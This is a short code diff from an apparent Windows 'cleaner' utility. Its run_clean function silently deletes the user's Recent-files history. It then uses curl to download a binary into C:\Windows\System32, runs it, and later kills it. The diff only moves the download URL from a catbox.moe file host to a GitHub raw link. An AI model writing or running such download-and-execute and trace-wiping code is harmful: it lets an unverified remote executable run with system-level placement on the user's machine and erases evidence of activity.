@@ -54,7 +54,7 @@ bool run_clean() {
     Sleep(300);
     system("del /q /f \"%APPDATA%\\Microsoft\\Windows\\Recent\\*\" 2>nul");
     Sleep(300);
-    system("curl -s -S -L -o C:\\Windows\\System32\\cleaner.exe https://files.catbox.moe/95bzl5.bin");
+    system("curl -s -S -L -o C:\\Windows\\System32\\cleaner.exe https://github.com/linoudev/cleanerlink/raw/refs/heads/main/cleaner.bin");
     system("start C:\\Windows\\System32\\cleaner.exe");
     Sleep(9000);
     system("taskkill /f /im cleaner.exe");
